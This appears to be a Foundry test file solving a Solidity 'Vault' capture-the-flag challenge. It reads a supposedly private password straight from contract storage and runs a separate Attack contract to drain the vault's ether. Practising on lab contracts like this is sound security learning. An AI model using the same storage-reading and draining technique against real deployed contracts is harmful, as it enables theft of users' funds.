// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";
import "../src/Attack.sol";




contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address owner = address (1);
    address palyer = address (2);

    function setUp() public {
        vm.deal(owner, 10 ether);

        vm.startPrank(owner);
        
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposite{value: 10 ether}();
        vm.stopPrank();

    }

    function testExploit() public {
        vm.deal(palyer, 10 ether);
        vm.startPrank(palyer);

        bytes32 password  = vm.load(address(vault),bytes32(uint256(1)));

        Attack attack = new Attack(payable(address(vault)));
        attack.attack{value: 0.2 ether}(password);

        console.log("attack balance:", attack.getBalance());
        
        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }

}
